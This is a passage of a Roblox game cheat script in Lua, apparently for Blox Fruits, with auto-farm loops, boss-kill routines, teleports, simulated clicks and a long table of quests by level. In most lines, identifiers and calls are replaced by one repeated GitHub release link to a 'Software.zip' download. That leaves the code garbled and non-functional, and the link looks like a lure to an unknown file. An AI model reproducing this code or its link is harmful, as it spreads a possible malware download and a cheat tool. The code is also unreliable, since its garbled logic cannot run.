                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(60, 60, 60)
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = PosMon
                        elseif https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == Ms and (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).magnitude <= 400 then
                            if HideHitBlox then
                                https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1
                            else
                                https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 70
                            end
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(60, 60, 60)
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = PosMon
                        end
                    end
                end
            end 
        end)
    end)

    https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true

    spawn(function() -- vẫn còn dùng được.
        while wait(.1) do
            if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip then
                local Lv = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
                if Lv >= 700 and OldWorld then
                    AutoKaitan = false
                    https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                    https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                    Auto_Farm = false
                    if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == true and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == 0 then
                        TP2(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(4851.8720703125, 5.6514348983765, 718.47094726563))
                        wait(.5)
                        game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("DressrosaQuestProgress","Detective")
                        EquipWeapon("Key")
                        TP2(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1347.7124, 37.3751602, -1325.6488))
                        wait(3)
                    elseif https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == false and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == 1 then
                        if game:GetService("Workspace").Enemies:FindFirstChild("Ice Admiral [Lv. 700] [Boss]") then
                            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Ice Admiral [Lv. 700] [Boss]" and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip > 0 then
                                    repeat game:GetService("RunService").Heartbeat:wait()
                                        pcall(function()
                                            EquipWeapon(SelectToolWeapon)
                                            TP(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip * https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 20, 10))
                                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(60,60,60)
                                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = .8
                                            game:GetService("VirtualUser"):CaptureController()
                                            game:GetService("VirtualUser"):Button1Down(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1280, 870),https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
                                        end)
                                    until https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip <= 0 or not https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
                                    game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TravelDressrosa")
                                end
                            end
                        else
                            TP2(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1347.7124, 37.3751602, -1325.6488))
                        end
                    else
                        game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TravelDressrosa")
                    end
                end
            end
        end
    end)

	spawn(function()
		pcall(function()
			while wait() do
				if AutoKaitan then
					if game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip >= 1500 and NewWorld then
						Auto_Farm = false
						if game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("ZQuestProgress","Check") == 0 then
							TP2(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1926.3221435547, 12.819851875305, 1738.3092041016))
							if (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1926.3221435547, 12.819851875305, 1738.3092041016).Position - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude <= 10 then
								wait(1.1)
								game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("ZQuestProgress","Begin")
							end
							wait(2)
							if game:GetService("Workspace").Enemies:FindFirstChild("rip_indra [Lv. 1500] [Boss]") then
								for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
									if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "rip_indra [Lv. 1500] [Boss]" then
										repeat game:GetService("RunService").Heartbeat:wait()
											pcall(function()
												EquipWeapon(SelectToolWeapon)
												TP(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip * https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0,25,25))
												require(game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1000
												game:GetService'VirtualUser':CaptureController()
												game:GetService'VirtualUser':Button1Down(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1280, 672))
												FoundIndra = true
												game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TravelZou")
												sethiddenproperty(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, "SimulationRadius", https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
											end)
										until AutoThird == false or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip <= 0 or not https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
									end
								end
							elseif not game:GetService("Workspace").Enemies:FindFirstChild("rip_indra [Lv. 1500] [Boss]") and (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-26880.93359375, 22.848554611206, 473.18951416016).Position - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude <= 1000 then
								TP(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-26880.93359375, 22.848554611206, 473.18951416016))
							end
						end
					end
				end
			end
		end)
	end)

function CheckLevel()
    local Lv = game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
    if OldWorld then
        if Lv == 1 or Lv <= 9 or SelectMonster == "Bandit [Lv. 5]" then -- Bandit
            Ms = "Bandit [Lv. 5]"
            NameQuest = "BanditQuest1"
            QuestLv = 1
            NameMon = "Bandit"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1060.9383544922, 16.455066680908, 1547.7841796875)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1038.5533447266, 41.296249389648, 1576.5098876953)
        elseif Lv == 10 or Lv <= 14 or SelectMonster == "Monkey [Lv. 14]" then -- Monkey
            Ms = "Monkey [Lv. 14]"
            NameQuest = "JungleQuest"
            QuestLv = 1
            NameMon = "Monkey"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1601.6553955078, 36.85213470459, 153.38809204102)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1448.1446533203, 50.851993560791, 63.60718536377)
        elseif Lv == 15 or Lv <= 29 or SelectMonster == "Gorilla [Lv. 20]" then -- Gorilla
            Ms = "Gorilla [Lv. 20]"
            NameQuest = "JungleQuest"
            QuestLv = 2
            NameMon = "Gorilla"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1601.6553955078, 36.85213470459, 153.38809204102)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1142.6488037109, 40.462348937988, -515.39227294922)
        elseif Lv == 30 or Lv <= 39 or SelectMonster == "Pirate [Lv. 35]" then -- Pirate
            Ms = "Pirate [Lv. 35]"
            NameQuest = "BuggyQuest1"
            QuestLv = 1
            NameMon = "Pirate"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1140.1761474609, 4.752049446106, 3827.4057617188)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1201.0881347656, 40.628940582275, 3857.5966796875)
        elseif Lv == 40 or Lv <= 59 or SelectMonster == "Brute [Lv. 45]" then -- Brute
            Ms = "Brute [Lv. 45]"
            NameQuest = "BuggyQuest1"
            QuestLv = 2
            NameMon = "Brute"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1140.1761474609, 4.752049446106, 3827.4057617188)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1387.5324707031, 24.592035293579, 4100.9575195313)
        elseif Lv == 60 or Lv <= 74 or SelectMonster == "Desert Bandit [Lv. 60]" then -- Desert Bandit
            Ms = "Desert Bandit [Lv. 60]"
            NameQuest = "DesertQuest"
            QuestLv = 1
            NameMon = "Desert Bandit"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(896.51721191406, 6.4384617805481, 4390.1494140625)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(984.99896240234, 16.109552383423, 4417.91015625)
        elseif Lv == 75 or Lv <= 89 or SelectMonster == "Desert Officer [Lv. 70]" then -- Desert Officer
            Ms = "Desert Officer [Lv. 70]"
            NameQuest = "DesertQuest"
            QuestLv = 2
            NameMon = "Desert Officer"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(896.51721191406, 6.4384617805481, 4390.1494140625)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1547.1510009766, 14.452038764954, 4381.8002929688)
        elseif Lv == 90 or Lv <= 99 or SelectMonster == "Snow Bandit [Lv. 90]" then -- Snow Bandit
            Ms = "Snow Bandit [Lv. 90]"
            NameQuest = "SnowQuest"
            QuestLv = 1
            NameMon = "Snow Bandit"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1386.8073730469, 87.272789001465, -1298.3576660156)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1356.3028564453, 105.76865386963, -1328.2418212891)
        elseif Lv == 100 or Lv <= 119 or SelectMonster == "Snowman [Lv. 100]" then -- Snowman
            Ms = "Snowman [Lv. 100]"
            NameQuest = "SnowQuest"
            QuestLv = 2
            NameMon = "Snowman"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1386.8073730469, 87.272789001465, -1298.3576660156)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1218.7956542969, 138.01184082031, -1488.0262451172)
        elseif Lv == 120 or Lv <= 149 or SelectMonster == "Chief Petty Officer [Lv. 120]" then -- Chief Petty Officer
            Ms = "Chief Petty Officer [Lv. 120]"
            NameQuest = "MarineQuest2"
            QuestLv = 1
            NameMon = "Chief Petty Officer"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5035.49609375, 28.677835464478, 4324.1840820313)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-4931.1552734375, 65.793113708496, 4121.8393554688)
        elseif Lv == 150 or Lv <= 174 or SelectMonster == "Sky Bandit [Lv. 150]" then -- Sky Bandit
            Ms = "Sky Bandit [Lv. 150]"
            NameQuest = "SkyQuest"
            QuestLv = 1
            NameMon = "Sky Bandit"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-4842.1372070313, 717.69543457031, -2623.0483398438)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-4955.6411132813, 365.46365356445, -2908.1865234375)
        elseif Lv == 175 or Lv <= 249 or SelectMonster == "Dark Master [Lv. 175]" then -- Dark Master
            Ms = "Dark Master [Lv. 175]"
            NameQuest = "SkyQuest"
            QuestLv = 2
            NameMon = "Dark Master"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-4842.1372070313, 717.69543457031, -2623.0483398438)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5148.1650390625, 439.04571533203, -2332.9611816406)
        elseif Lv == 250 or Lv <= 274 or SelectMonster == "Toga Warrior [Lv. 225]" then -- Toga Warrior
            Ms = "Toga Warrior [Lv. 250]"
            NameQuest = "ColosseumQuest"
            QuestLv = 1
            NameMon = "Toga Warrior"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1577.7890625, 7.4151420593262, -2984.4838867188)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1872.5166015625, 49.080215454102, -2913.810546875)
        elseif Lv == 275 or Lv <= 299 or SelectMonster == "Gladiator [Lv. 275]" then -- Gladiator
            Ms = "Gladiator [Lv. 275]"
            NameQuest = "ColosseumQuest"
            QuestLv = 2
            NameMon = "Gladiator"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1577.7890625, 7.4151420593262, -2984.4838867188)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1465.688, 7.786, -3136.755)
        elseif Lv == 300 or Lv <= 324 or SelectMonster == "Military Soldier [Lv. 300]" then -- Military Soldier
            Ms = "Military Soldier [Lv. 300]"
            NameQuest = "MagmaQuest"
            QuestLv = 1
            NameMon = "Military Soldier"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5316.1157226563, 12.262831687927, 8517.00390625)
        elseif Lv == 325 or Lv <= 374 or SelectMonster == "Military Spy [Lv. 325]" then -- Military Spy
            Ms = "Military Spy [Lv. 325]"
            NameQuest = "MagmaQuest"
            QuestLv = 2
            NameMon = "Military Spy"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5316.1157226563, 12.262831687927, 8517.00390625)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5984.0532226563, 82.14656829834, 8753.326171875)
        elseif Lv == 375 or Lv <= 399 or SelectMonster == "Fishman Warrior [Lv. 375]" then -- Fishman Warrior 
            Ms = "Fishman Warrior [Lv. 375]"
            NameQuest = "FishmanQuest"
            QuestLv = 1
            NameMon = "Fishman Warrior"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(61122.65234375, 18.497442245483, 1569.3997802734)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(60844.10546875, 98.462875366211, 1298.3985595703)
			if Auto_Farm and (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude > 3000 then
				game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("requestEntrance",https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(61163.8515625, 11.6796875, 1819.7841796875))
			end
        elseif Lv == 400 or Lv <= 449 or SelectMonster == "Fishman Commando [Lv. 400]" then -- Fishman Commando
            Ms = "Fishman Commando [Lv. 400]"
            NameQuest = "FishmanQuest"
            QuestLv = 2
            NameMon = "Fishman Commando"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(61122.65234375, 18.497442245483, 1569.3997802734)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(61738.3984375, 64.207321166992, 1433.8375244141)
			if Auto_Farm and (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude > 3000 then
				game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("requestEntrance",https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(61163.8515625, 11.6796875, 1819.7841796875))
			end
        elseif Lv == 450 or Lv <= 474 or SelectMonster == "God's Guard [Lv. 450]" then -- God's Guard
            Ms = "God's Guard [Lv. 450]"
            NameQuest = "SkyExp1Quest"
            QuestLv = 1
            NameMon = "God's Guard"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-4721.8603515625, 845.30297851563, -1953.8489990234)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-4628.0498046875, 866.92877197266, -1931.2352294922)
			if Auto_Farm and (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude > 3000 then
				game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("requestEntrance",https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-4607.82275, 872.54248, -1667.55688))
			end
        elseif Lv == 475 or Lv <= 524 or SelectMonster == "Shanda [Lv. 475]" then -- Shanda
            Ms = "Shanda [Lv. 475]"
            NameQuest = "SkyExp1Quest"
            QuestLv = 2
            NameMon = "Shanda"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-7863.1596679688, 5545.5190429688, -378.42266845703)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-7685.1474609375, 5601.0751953125, -441.38876342773)
			if Auto_Farm and (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude > 3000 then
				game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("requestEntrance",https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-7894.6176757813, 5547.1416015625, -380.29119873047))
			end
        elseif Lv == 525 or Lv <= 549 or SelectMonster == "Royal Squad [Lv. 525]" then -- Royal Squad
            Ms = "Royal Squad [Lv. 525]"
            NameQuest = "SkyExp2Quest"
            QuestLv = 1
            NameMon = "Royal Squad"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-7903.3828125, 5635.9897460938, -1410.923828125)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-7654.2514648438, 5637.1079101563, -1407.7550048828)
        elseif Lv == 550 or Lv <= 624 or SelectMonster == "Royal Soldier [Lv. 550]" then -- Royal Soldier
            Ms = "Royal Soldier [Lv. 550]"
            NameQuest = "SkyExp2Quest"
            QuestLv = 2
            NameMon = "Royal Soldier"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-7903.3828125, 5635.9897460938, -1410.923828125)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-7760.4106445313, 5679.9077148438, -1884.8112792969)
        elseif Lv == 625 or Lv <= 649 or SelectMonster == "Galley Pirate [Lv. 625]" then -- Galley Pirate
            Ms = "Galley Pirate [Lv. 625]"
            NameQuest = "FountainQuest"
            QuestLv = 1
            NameMon = "Galley Pirate"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5258.2788085938, 38.526931762695, 4050.044921875)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5557.1684570313, 152.32717895508, 3998.7758789063)
        elseif Lv >= 650 or SelectMonster == "Galley Captain [Lv. 650]" then -- Galley Captain
            Ms = "Galley Captain [Lv. 650]"
            NameQuest = "FountainQuest"
            QuestLv = 2
            NameMon = "Galley Captain"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5258.2788085938, 38.526931762695, 4050.044921875)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5677.6772460938, 92.786109924316, 4966.6323242188)
        end
    end
    if NewWorld then
        if Lv == 700 or Lv <= 724 or SelectMonster == "Raider [Lv. 700]" then -- Raider
            Ms = "Raider [Lv. 700]"
            NameQuest = "Area1Quest"
            QuestLv = 1
            NameMon = "Raider"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-427.72567749023, 72.99634552002, 1835.9426269531)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(68.874565124512, 93.635643005371, 2429.6752929688)
        elseif Lv == 725 or Lv <= 774 or SelectMonster == "Mercenary [Lv. 725]" then -- Mercenary
            Ms = "Mercenary [Lv. 725]"
            NameQuest = "Area1Quest"
            QuestLv = 2
            NameMon = "Mercenary"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-427.72567749023, 72.99634552002, 1835.9426269531)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-864.85009765625, 122.47104644775, 1453.1505126953)
        elseif Lv == 775 or Lv <= 874 or SelectMonster == "Swan Pirate [Lv. 775]" then -- Swan Pirate
            Ms = "Swan Pirate [Lv. 775]"
            NameQuest = "Area2Quest"
            QuestLv = 1
            NameMon = "Swan Pirate"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(635.61151123047, 73.096351623535, 917.81298828125)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1065.3669433594, 137.64012145996, 1324.3798828125)
        elseif Lv == 875 or Lv <= 899 or SelectMonster == "Marine Lieutenant [Lv. 875]" then -- Marine Lieutenant
            Ms = "Marine Lieutenant [Lv. 875]"
            NameQuest = "MarineQuest3"
            QuestLv = 1
            NameMon = "Marine Lieutenant"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2440.9934082031, 73.04190826416, -3217.7082519531)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2489.2622070313, 84.613594055176, -3151.8830566406)
        elseif Lv == 900 or Lv <= 949 or SelectMonster == "Marine Captain [Lv. 900]" then -- Marine Captain
            Ms = "Marine Captain [Lv. 900]"
            NameQuest = "MarineQuest3"
            QuestLv = 2
            NameMon = "Marine Captain"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2440.9934082031, 73.04190826416, -3217.7082519531)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2335.2026367188, 79.786659240723, -3245.8674316406)
        elseif Lv == 950 or Lv <= 974 or SelectMonster == "Zombie [Lv. 950]" then -- Zombie
            Ms = "Zombie [Lv. 950]"
            NameQuest = "ZombieQuest"
            QuestLv = 1
            NameMon = "Zombie"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5494.3413085938, 48.505931854248, -794.59094238281)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5536.4970703125, 101.08577728271, -835.59075927734)
        elseif Lv == 975 or Lv <= 999 or SelectMonster == "Vampire [Lv. 975]" then -- Vampire
            Ms = "Vampire [Lv. 975]"
            NameQuest = "ZombieQuest"
            QuestLv = 2
            NameMon = "Vampire"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5494.3413085938, 48.505931854248, -794.59094238281)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5806.1098632813, 16.722528457642, -1164.4384765625)
        elseif Lv == 1000 or Lv <= 1049 or SelectMonster == "Snow Trooper [Lv. 1000]" then -- Snow Trooper
            Ms = "Snow Trooper [Lv. 1000]"
            NameQuest = "SnowMountainQuest"
            QuestLv = 1
            NameMon = "Snow Trooper"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(607.05963134766, 401.44781494141, -5370.5546875)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(535.21051025391, 432.74209594727, -5484.9165039063)
        elseif Lv == 1050 or Lv <= 1099 or SelectMonster == "Winter Warrior [Lv. 1050]" then -- Winter Warrior
            Ms = "Winter Warrior [Lv. 1050]"
            NameQuest = "SnowMountainQuest"
            QuestLv = 2
            NameMon = "Winter Warrior"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(607.05963134766, 401.44781494141, -5370.5546875)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1234.4449462891, 456.95419311523, -5174.130859375)
        elseif Lv == 1100 or Lv <= 1124 or SelectMonster == "Lab Subordinate [Lv. 1100]" then -- Lab Subordinate
            Ms = "Lab Subordinate [Lv. 1100]"
            NameQuest = "IceSideQuest"
            QuestLv = 1
            NameMon = "Lab Subordinate"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-6061.841796875, 15.926671981812, -4902.0385742188)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5720.5576171875, 63.309471130371, -4784.6103515625)
        elseif Lv == 1125 or Lv <= 1174 or SelectMonster == "Horned Warrior [Lv. 1125]" then -- Horned Warrior
            Ms = "Horned Warrior [Lv. 1125]"
            NameQuest = "IceSideQuest"
            QuestLv = 2
            NameMon = "Horned Warrior"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-6061.841796875, 15.926671981812, -4902.0385742188)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-6292.751953125, 91.181983947754, -5502.6499023438)
        elseif Lv == 1175 or Lv <= 1199 or SelectMonster == "Magma Ninja [Lv. 1175]" then -- Magma Ninja
            Ms = "Magma Ninja [Lv. 1175]"
            NameQuest = "FireSideQuest"
            QuestLv = 1
            NameMon = "Magma Ninja"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5429.0473632813, 15.977565765381, -5297.9614257813)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5461.8388671875, 130.36347961426, -5836.4702148438)
        elseif Lv == 1200 or Lv <= 1249 or SelectMonster == "Lava Pirate [Lv. 1200]" then -- Lava Pirate
            Ms = "Lava Pirate [Lv. 1200]"
            NameQuest = "FireSideQuest"
            QuestLv = 2
            NameMon = "Lava Pirate"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5429.0473632813, 15.977565765381, -5297.9614257813)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5251.1889648438, 55.164535522461, -4774.4096679688)
